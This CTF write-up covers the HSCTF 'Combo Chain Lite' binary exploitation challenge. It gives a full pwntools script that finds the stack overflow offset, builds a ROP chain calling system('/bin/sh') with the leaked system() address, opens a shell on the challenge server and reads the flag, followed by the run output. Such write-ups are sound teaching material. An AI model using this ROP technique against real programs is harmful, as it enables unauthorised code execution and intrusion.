## Combo Chain Lite
### Category : Binary Exploitation

---

So, a standard ROP chain. For how to build a ROP chain, read my writeups for [BabyRop](../Harekaze/Babyrop.md) from Harekaze CTF or [Baby1](../Sec_fest/Baby1.md) from Security Fest CTF.

The only difference here, I figured was, that system() as symbol isn't available, instead we are given the location when we start the CTF. So, I added a small parser for the same.

`exploit.py`
```
from pwn import *

def get_offset(elf):
    io = process(elf.path)
    io.sendline(cyclic(2010))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("%#x stack", stack)
    pattern = core.read(stack, 4)
    info("%r pattern", pattern)
    offset = cyclic_find(pattern)
    info("OFFSET : %s",offset)
    return offset

elf = context.binary = ELF('combo-chain-lite')

offset = get_offset(elf)

shell = next(elf.search("/bin/sh"))

#system = elf.symbols.system

pop_gadget = 0x0000000000401273
ret_gadget = 0x000000000040101a
#io = process(elf.path)
io = remote('pwn.hsctf.com',3131)
#io.sendline(payload)
io.recvuntil("Here's your free computer: ")
system = io.recvline()
system = int(system,16)
info("SYSTEM : %#x" , system)
info ("SHELL : %#x", shell)
info("POP Gadget : %#x",pop_gadget)
info("RET Gadget : %#x",ret_gadget)
shell = p64(shell)
system = p64(system)
pop_gadget = p64(pop_gadget)
ret_gadget = p64(ret_gadget)
info("SYSTEM : %s" , system)
info ("SHELL : %s", shell)
info("POP Gadget : %s",pop_gadget)
info("RET Gadget : %s",ret_gadget)
payload = 'A'*(offset)
payload += ret_gadget
payload += pop_gadget
payload += shell
payload += system
io.sendline(payload)
io.recvuntil(" CARNAGE!:")
io.sendline("cat flag")
success("FLAG : %s",io.recvline())

```

`output`
```
[*] '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/combo-chain-lite'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[x] Starting local process '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/combo-chain-lite'
[+] Starting local process '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/combo-chain-lite': pid 21800
[*] Process '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/combo-chain-lite' stopped with exit code -11 (SIGSEGV) (pid 21800)
[!] Found bad environment at 0x7ffc0a224fa6
[x] Parsing corefile...
[*] '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/core.21800'
    Arch:      amd64-64-little
    RIP:       0x4011be
    RSP:       0x7ffc0a223e48
    Exe:       '/home/vipul/Desktop/HSCTF/combo_chain_lite_SOLVED/combo-chain-lite' (0x401000)
    Fault:     0x6161616661616165
[+] Parsing corefile...: Done
[*] 0x7ffc0a223e48 stack
[*] 'eaaa' pattern
[*] OFFSET : 16
[x] Opening connection to pwn.hsctf.com on port 3131
[x] Opening connection to pwn.hsctf.com on port 3131: Trying 165.22.188.9
[+] Opening connection to pwn.hsctf.com on port 3131: Done
[*] SYSTEM : 0x7fa7540df390
[*] SHELL : 0x402051
[*] POP Gadget : 0x401273
[*] RET Gadget : 0x40101a
[*] SYSTEM : ��
    T�  
[*] SHELL : Q @     
[*] POP Gadget : s@     
[*] RET Gadget : @     
[+] FLAG :  hsctf{wheeeeeee_that_was_fun}
[*] Closed connection to pwn.hsctf.com port 3131

```